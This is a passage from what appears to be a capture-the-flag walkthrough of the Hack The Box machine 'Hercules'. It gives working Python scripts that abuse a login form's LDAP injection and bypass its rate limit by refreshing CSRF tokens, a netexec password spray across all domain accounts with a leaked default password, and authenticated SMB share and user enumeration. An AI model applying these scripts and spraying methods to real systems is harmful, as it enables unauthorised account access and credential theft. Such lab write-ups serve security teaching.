![image-20260914173654838](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0a68870fc8584cf9.png)

![image-20260914173654838](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260914173654838.webp)

This could be that the encoded value is used, or it could be used for injection. It didn’t crash, which implies it’s being used as part of the username. What about LDAP injection? I’ll try a simple `*` as a wildcard. When I send “a\*” (double encoded), it returns:

![image-20260914180218709](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5503aa1297c4367a.png)

![image-20260914180218709](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260914180218709.webp)

When I try “aaaaaa\*”, it returns:

![image-20260914180156049](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b4bdb89180f72672.png)

![image-20260914180156049](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260914180156049.webp)

Those are both failures, but they are different, suggesting that there is a user that starts with “a”, but not one that starts with “aaaaaaa”. That’s an oracle I can use to brute force data from LDAP.

I can also extend the query to look at other fields with something like `*)(sAMAccountName=<oracle>*`. When I put “a” in for `<oracle>`, it returns “Login attempt failed”, but “zzzzz” returns “Invalid login attempt”.

### Rate Limit Bypass

I noted [above](#directory-brute-force) that the login form has a rate limit. I have a lot of data to explore, and can’t wait forever.

The rate limiting is controlled by the `__RequestVerificationToken` cookie, as well as the CSRF token that’s embedded in the page. If I clear the cookies from my browser and request the `/Login` page again, I get a fresh cookie as well as a new token in the form:

```typescript
HTTP/2 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-Frame-Options: SAMEORIGIN
Set-Cookie: __RequestVerificationToken=b2B95vDD1qkNrAkmBfKGsUOjwHsnbrFrothGIZHq8jgojxF3CrWCFfGLHVxvYyCGS0CWPwDQMJ_z49-VudbqnFPVkMxb0UOw5esIUSjqr6I1; path=/; HttpOnly
Date: Mon, 14 Sep 2026 22:06:16 GMT
Content-Length: 3213


...[snip]...
<form action="/Login" class="form-horizontal" method="post" role="form"><input name="__RequestVerificationToken" type="hidden" value="IXlrGgcHxzDgUHJLd1P8b5BY-ixmtS3kPsgrhesFKCvrMjC8gIH_6oWwz7gvJYmqbPjpoZReVC-_D6HjTP3uCZMJZ3nyDI0X9-sqUELVVd41" />                <a class="go-home-click-link" href="/"><img src="/Content/Assets/home-icon-small.png" alt="" /></a>
...[snip]...
```

If I send until I get the 30 second timer, and then replace the cookie with a new one, it returns a 500 error. That’s because the cookie and the token don’t match. If I add the new token, the timer is gone and it’s a valid request, even if the cool down time has not elapsed.

That means that any time I get a 429, I can just request a fresh `/Login` page, update the cookie and the token, and then continue brute forcing!

### Brute Force Script

#### Username Script

I’ll make a script to brute force items in LDAP. To get around the rate limiting, any time I get a 429 back, I will just drop the cookies, load `/Login` again, and get a new token. To keep track of that it turned out to be easiest to make a class.

I am only using `quote` once around the username, as `requests` will do it again before it sends data. One annoying bit is that `quote` doesn’t encode ‘~’. I’ll cheat a bit and just replace that at the encode time. I’ll also need to escape special characters in LDAP, for which I’ll grab `escape_filter_chars` from `ldap3.utils.conv`. My first script to brute force users looks like:

```python
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "ldap3",
#     "requests",
# ]
# ///
import re
import requests
import string
import urllib3
from ldap3.utils.conv import escape_filter_chars, unescape_filter_chars
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


login_url = "https://hercules.htb/Login"
token_name = "__RequestVerificationToken"
safe_chars = [escape_filter_chars(c) for c in string.printable.strip() if c not in string.ascii_uppercase]


def clean_print(s: str, end="\n"):
    print(unescape_filter_chars(s).decode(), end=end)


class LDAPInjecter:

    def __init__(self):
        self.sess = requests.session()
        self.sess.verify = False
        self.token = ""
        self.data = {
            token_name: self.token,
            "Username": "",
            "Password": "x",
            "RememberMe": "false",
        }
        self.refresh_token()

    def refresh_token(self):
        self.sess.cookies.clear()
        resp = self.sess.get(login_url)
        token = re.search(
            r'<input name="__RequestVerificationToken" type="hidden" value="(.+?)" />',
            resp.text,
        )
        if not token:
            raise ValueError
        self.token = token.group(1)
        self.data[token_name] = self.token

    def test_username(self, username: str) -> bool:
        self.data["Username"] = quote(username).replace("~", "%7E")
        resp = self.sess.post(login_url, data=self.data)
        if resp.status_code == 429:
            self.refresh_token()
            resp = self.sess.post(login_url, data=self.data)
        assert resp.status_code == 200
        if "Login attempt failed" in resp.text:
            return True
        if "Invalid login attempt" not in resp.text:
            breakpoint()
        return False

    def find_next_char(self, inject_template: str, progress: str, alpha: list[str]):
        for c in alpha:
            clean_print(f"\r{progress}{c}", end="")
            username = inject_template.format(res=progress, c=c)
            if self.test_username(f"{username}*"):
                if self.test_username(username):
                    clean_print(f"\r{progress}{c}")
                self.find_next_char(inject_template, progress + c, alpha)

    def brute_users(self):
        template = "{res}{c}"
        self.find_next_char(template, "", safe_chars)


inject = LDAPInjecter()
inject.brute_users()
```

This just brute forces the users who can log into the site:

```
oxdf@hacky$ uv run read_ldap.py
adriana.i
angelo.o
anthony.r
ashley.b
auditor
bob.w
camilla.b
clarissa.c
elijah.m
fernando.r
fiona.c
harris.d
heather.s
iis_apppoolidentity$
iis_defaultapppool$
iis_hadesapppool$
iis_webserver$
jacob.b
james.s
jennifer.a
jessica.e
joel.c
johanna.f
johnathan.j
ken.w
mark.s
mikayla.a
natalie.a
nate.h
patrick.s
ramona.l
ray.n
rene.s
shae.j
stephanie.w
stephen.m
tanya.r
taylor.m
tish.c
vincent.g
web_admin
will.s
winda.s
zeke.s
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

This takes a while to run as it’s a long list!

#### Description Brute Script Update

LDAP doesn’t hold the user’s password, so it must be fetching the user object and then using that object to do the password check. The other most interesting field in LDAP is often the description. I’ll update my script so that when it finds a user, it tries to find their description as well:

```python
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "ldap3",
#     "requests",
# ]
# ///
import re
import requests
import string
import urllib3
from ldap3.utils.conv import escape_filter_chars, unescape_filter_chars
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


login_url = "https://hercules.htb/Login"
token_name = "__RequestVerificationToken"
safe_chars = [escape_filter_chars(c) for c in string.printable.strip() if c not in string.ascii_uppercase]
user_template = "{res}{c}"
field_user_template = "{username})({field}={res}{c}"


def clean_print(s: str, end="\n"):
    print(unescape_filter_chars(s).decode(), end=end)


class LDAPInjecter:

    def __init__(self):
        self.sess = requests.session()
        self.sess.verify = False
        self.token = ""
        self.data = {
            token_name: self.token,
            "Username": "",
            "Password": "x",
            "RememberMe": "false",
        }
        self.refresh_token()

    def refresh_token(self):
        self.sess.cookies.clear()
        resp = self.sess.get(login_url)
        token = re.search(
            r'<input name="__RequestVerificationToken" type="hidden" value="(.+?)" />',
            resp.text,
        )
        if not token:
            raise ValueError
        self.token = token.group(1)
        self.data[token_name] = self.token

    def test_username(self, username: str) -> bool:
        self.data["Username"] = quote(username).replace("~", "%7E")
        resp = self.sess.post(login_url, data=self.data)
        if resp.status_code == 429:
            self.refresh_token()
            resp = self.sess.post(login_url, data=self.data)
        assert resp.status_code == 200
        if "Login attempt failed" in resp.text:
            return True
        if "Invalid login attempt" not in resp.text:
            breakpoint()
        return False

    def brute_user(self, progress: str):
        for c in safe_chars:
            clean_print(f"\r{progress}{c} ", end="")
            username = user_template.format(res=progress, c=c)
            if self.test_username(f"{username}*"):
                if self.test_username(username):
                    self.brute_description(username, "")
                self.brute_user(progress + c)

    def brute_description(self, username: str, progress: str):
        any_description = field_user_template.format(
            username=username, field="description", res="", c="*"
        )
        if not self.test_username(any_description):
            print(": <no description>")
            return
        for c in safe_chars:
            clean_print(f"\r{username}: {progress}{c}", end="")
            template = field_user_template.format(
                username=username, field="description", res=progress, c=c
            )
            if self.test_username(f"{template}*"):
                if self.test_username(template):
                    print()
                    return True
                if self.brute_description(username, progress + c):
                    return True
        clean_print(f"\r{username}: {progress}{c} ")
        return False


inject = LDAPInjecter()
inject.brute_user("")
```

This makes the same list, but this time showing the user’s description:

```html
oxdf@hacky$ time uv run read_ldap.py 
adriana.i : <no description>
angelo.o : <no description>
anthony.r : <no description>
ashley.b : <no description>
auditor : <no description>
bob.w : <no description>
camilla.b : <no description>
clarissa.c : <no description>
elijah.m : <no description>
fernando.r : <no description>
fiona.c : <no description>
harris.d : <no description>
heather.s : <no description>
iis_apppoolidentity$ : <no description>
iis_defaultapppool$ : <no description>
iis_hadesapppool$ : <no description>
iis_webserver$ : <no description>
jacob.b : <no description>
james.s : <no description>
jennifer.a : <no description>
jessica.e : <no description>
joel.c : <no description>
johanna.f : <no description>
johnathan.j: change*th1s_p@ssw()rd!!
ken.w : <no description>
mark.s : <no description>
mikayla.a : <no description>
natalie.a : <no description>
nate.h : <no description>
patrick.s : <no description>
ramona.l : <no description>
ray.n : <no description>
rene.s : <no description>
shae.j : <no description>
stephanie.w : <no description>
stephen.m : <no description>
tanya.r : <no description>
taylor.m : <no description>
tish.c : <no description>
vincent.g : <no description>
web_admin : <no description>
will.s : <no description>
winda.s : <no description>
zeke.s : <no description>
      
real    24m25.405s
user    0m28.700s
sys     0m7.505s
```

There’s one interesting value that looks like a password!

### Password Validation

I’ll try that password for johnathan.j, and it returns an error:

```css
oxdf@hacky$ netexec ldap dc.hercules.htb -u johnathan.j -p 'change*th1s_p@ssw()rd!!'
LDAP        10.129.242.196  389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.242.196  389    DC               [-] hercules.htb\johnathan.j:change*th1s_p@ssw()rd!! STATUS_NOT_SUPPORTED
```

This is showing that NTLM auth is disabled. I’ll try again with Kerberos:

```css
oxdf@hacky$ netexec ldap dc.hercules.htb -u johnathan.j -p 'change*th1s_p@ssw()rd!!' -k
LDAP        dc.hercules.htb 389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\johnathan.j:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
```

The password fails. Given that this looks like some kind of default password, perhaps other users have had it set as well. I’ll try the full user list:

```java
oxdf@hacky$ netexec ldap dc.hercules.htb -u ldap_users.txt -p 'change*th1s_p@ssw()rd!!' -k --continue-on-success
LDAP        dc.hercules.htb 389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\adriana.i:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\angelo.o:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\anthony.r:change*th1s_p@ssw()rd!! KDC_ERR_CLIENT_REVOKED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\ashley.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\auditor:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\bob.w:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\camilla.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\clarissa.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\elijah.m:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\fernando.r:change*th1s_p@ssw()rd!! KDC_ERR_CLIENT_REVOKED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\fiona.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\harris.d:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\heather.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\iis_apppoolidentity$:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\iis_defaultapppool$:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\iis_hadesapppool$:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\iis_webserver$:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\jacob.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\james.s:change*th1s_p@ssw()rd!! KDC_ERR_CLIENT_REVOKED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\jennifer.a:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\jessica.e:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\joel.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\johanna.f:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\johnathan.j:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\mark.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\mikayla.a:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\natalie.a:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\nate.h:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\patrick.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\ramona.l:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\ray.n:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\rene.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\shae.j:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\stephanie.w:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\stephen.m:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\tanya.r:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\taylor.m:change*th1s_p@ssw()rd!! KDC_ERR_CLIENT_REVOKED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\tish.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\vincent.g:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\web_admin:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\will.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\winda.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        dc.hercules.htb 389    DC               [-] hercules.htb\zeke.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

It works for ken.w!

## Auth as natalie.a

### Authenticated Enumeration

#### SMB - TCP 445

The shares on the DC look like the standard domain controller shares, plus three more:

```sql
oxdf@hacky$ netexec smb dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --shares
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
SMB         dc.hercules.htb 445    dc               [*] Enumerated shares
SMB         dc.hercules.htb 445    dc               Share           Permissions            Remark
SMB         dc.hercules.htb 445    dc               -----           -----------            ------
SMB         dc.hercules.htb 445    dc               ADMIN$                                 Remote Admin
SMB         dc.hercules.htb 445    dc               C$                                     Default share
SMB         dc.hercules.htb 445    dc               Department                             
SMB         dc.hercules.htb 445    dc               IPC$            READ                   Remote IPC
SMB         dc.hercules.htb 445    dc               NETLOGON        READ                   Logon server share 
SMB         dc.hercules.htb 445    dc               Reports                                
SMB         dc.hercules.htb 445    dc               SYSVOL          READ                   Logon server share 
SMB         dc.hercules.htb 445    dc               Users           READ 
```

ken.w doesn’t have access to `Department` or `Reports`, and `Users` has a ton of user directories, but no files:

```yaml
oxdf@hacky$ smbclient.py hercules.htb/ken.w:'change*th1s_p@ssw()rd!!'@dc.hercules.htb -k -dc-ip 10.129.242.196
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
Type help for list of commands
# shares
Share Name                Type            Comment
----------------------------------------------------------------------
ADMIN$                    DISK (SPECIAL)  Remote Admin
C$                        DISK (SPECIAL)  Default share
Department                DISK
IPC$                      IPC (SPECIAL)   Remote IPC
NETLOGON                  DISK            Logon server share
Reports                   DISK
SYSVOL                    DISK            Logon server share
Users                     DISK
# use Users
# ls
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 .
drw-rw-rw-          0  Wed Dec  4 01:45:11 2024 ..
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Administrator
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 adriana.i
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 alastair.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 amarnath.r
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 angelo.o
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 anthony.r
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 aravind.r
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 ashiqul.i
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 ashley.b
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 auditor
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 awadhesh.k
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 barun.k
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 bhupendra.p
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 bob.w
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 brady.j
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 camilla.b
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 candi.j
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 charlene.h
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 clarissa.c
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 dale.f
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 declan.k
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 dharminder.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 dolores.r
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 ehab.m
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 elijah.m
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 esraa.h
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 fatih.y
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 fernando.r
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 fiona.c
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 friar.l
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 giang.v
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Guest
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 gulzar.h
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 hani.k
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 harris.d
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 head.h
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 heather.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 horace.w
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 iis_administrator
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 iis_apppoolidentity$
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 iis_defaultapppool$
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 iis_hadesapppool$
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 iis_webserver$
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 inam.u
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 jacob.b
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 james.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 janzen.c
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 jennifer.a
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 jessica.e
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 joel.c
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 johanna.f
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 johnathan.j
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 jyoti.c
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 karrie.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 ken.w
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 kerrie.b
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 koala.b
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 krbtgt
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 kyla.w
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 leighton.j
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 lo.l
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 madhur.j
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 manas.m
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 marivic.g
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 mark.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 megha.d
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 mikayla.a
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 milica.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 mohin.u
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 mukta.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 namrata.j
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 natalie.a
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 nate.h
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 neha.f
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 nischal.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 omar.h
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 pasha.k
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 patrick.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 pitt.b
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 pritesh.m
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 rafique.a
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 ramona.l
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 ranjana.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 ray.n
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 renata.o
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 rene.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 rizwana.k
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 rubal.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 saif.h
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 sandipan.d
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 satinder.p
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 shae.j
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 shantanu.m
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 shikha.c
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 silver.r
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 song.b
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 stephanie.w
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 stephen.m
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 subash.k
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 sunita.r
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 talwinder.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 tanya.r
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 taylor.m
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 tere.g
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 tish.c
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 tulsi.p
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 vara.p
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 vincent.g
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 virender.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 web_admin
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 will.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 winda.s
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 yomna.a
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 zeke.s
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

I’ll run `spider_plus` with `netexec` and it finds no files on this share.

I can list 42 users:

```yaml
oxdf@hacky$ netexec smb dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --users
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
SMB         dc.hercules.htb 445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         dc.hercules.htb 445    dc               Administrator                 2025-10-17 10:49:44 0       Built-in account for administering the computer/domain 
SMB         dc.hercules.htb 445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         dc.hercules.htb 445    dc               krbtgt                        2024-12-04 01:39:35 0       Key Distribution Center Service Account 
SMB         dc.hercules.htb 445    dc               taylor.m                      2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               fernando.r                    2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               james.s                       2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               anthony.r                     2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               iis_webserver$                2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               iis_hadesapppool$             2024-12-04 01:44:44 0        
SMB         dc.hercules.htb 445    dc               iis_apppoolidentity$          2024-12-04 01:44:44 0        
SMB         dc.hercules.htb 445    dc               iis_defaultapppool$           2024-12-04 01:44:44 0        
SMB         dc.hercules.htb 445    dc               auditor                       2024-12-04 01:44:44 0        
SMB         dc.hercules.htb 445    dc               vincent.g                     2024-12-04 01:44:45 0        
SMB         dc.hercules.htb 445    dc               nate.h                        2024-12-04 01:44:45 0        
SMB         dc.hercules.htb 445    dc               stephen.m                     2024-12-04 01:44:45 0        
SMB         dc.hercules.htb 445    dc               mark.s                        2024-12-04 01:44:46 0        
SMB         dc.hercules.htb 445    dc               elijah.m                      2024-12-04 01:44:46 0        
SMB         dc.hercules.htb 445    dc               angelo.o                      2024-12-04 01:44:46 0        
SMB         dc.hercules.htb 445    dc               ashley.b                      2024-12-04 01:44:46 0        
SMB         dc.hercules.htb 445    dc               clarissa.c                    2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               winda.s                       2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               rene.s                        2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               will.s                        2024-12-04 01:44:47 0        
